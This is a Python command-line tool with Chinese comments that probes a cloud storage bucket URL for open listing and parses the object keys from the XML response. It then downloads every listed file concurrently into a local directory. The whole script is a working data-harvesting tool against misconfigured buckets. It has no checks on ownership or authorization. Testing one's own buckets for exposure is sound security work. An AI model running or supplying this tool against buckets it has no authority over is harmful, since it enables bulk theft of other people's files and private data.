import requests
import re
import os
import argparse
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed


def download_file(url, local_path):
    """
    下载文件到本地路径

    参数:
        url (str): 文件URL
        local_path (str): 本地保存路径
    """
    try:
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()

        # 确保目录存在
        os.makedirs(os.path.dirname(local_path), exist_ok=True)

        with open(local_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        return True, url, local_path
    except Exception as e:
        return False, url, str(e)


def check_bucket_traversal(url, download_path=None, max_workers=5):
    """
    检查存储桶遍历漏洞并下载文件

    参数:
        url (str): 要测试的存储桶URL
        download_path (str): 下载文件的本地路径
        max_workers (int): 并发下载的最大线程数
    """
    try:
        # 发送请求获取存储桶内容
        response = requests.get(url, timeout=10)

        if response.status_code == 200:
            print(f"[+] 可访问的存储桶: {url}")

            # 使用正则表达式提取key值
            keys = re.findall(r'<Key>(.*?)</Key>', response.text)

            if keys:
                print(f"[+] 发现 {len(keys)} 个key")

                # 准备下载任务
                download_tasks = []
                for key in keys:
                    file_url = urljoin(url, key)
                    if download_path:
                        local_file = os.path.join(download_path, key)
                        # 替换可能存在的路径遍历字符
                        local_file = os.path.normpath(local_file)
                        download_tasks.append((file_url, local_file))

                # 并发下载文件
                if download_tasks and download_path:
                    print(f"[+] 开始下载文件到: {download_path}")
                    success_count = 0
                    failed_count = 0

                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
                        futures = [executor.submit(download_file, task[0], task[1])
                                   for task in download_tasks]

                        for future in as_completed(futures):
                            success, file_url, result = future.result()
                            if success:
                                print(f"    √ 下载成功: {file_url} -> {result}")
                                success_count += 1
                            else:
                                print(f"    × 下载失败: {file_url} - {result}")
                                failed_count += 1

                    print(f"\n[+] 下载完成: 成功 {success_count} 个, 失败 {failed_count} 个")
                else:
                    print("[!] 未指定下载路径，仅显示key列表:")
                    for key in keys:
                        print(f"    - {key}")
            else:
                print("[-] 未找到Key值，可能不是存储桶或格式不匹配")
        else:
            print(f"[-] 无法访问: {url} (HTTP {response.status_code})")

    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")


def main():
    # 设置命令行参数
    parser = argparse.ArgumentParser(description="存储桶遍历漏洞检测与文件下载工具")
    parser.add_argument("-u", "--url", help="要测试的存储桶URL", required=True)
    parser.add_argument("-d", "--download", help="下载文件的本地路径")
    parser.add_argument("-t", "--threads", type=int, default=5,
                        help="并发下载线程数 (默认: 5)")

    args = parser.parse_args()

    # 验证URL格式
    parsed_url = urlparse(args.url)
    if not all([parsed_url.scheme, parsed_url.netloc]):
        print("[-] 无效的URL格式，请使用完整的URL (如: http://example.com)")
        return

    # 执行检测和下载
    check_bucket_traversal(args.url, args.download, args.threads)


if __name__ == "__main__":
    main()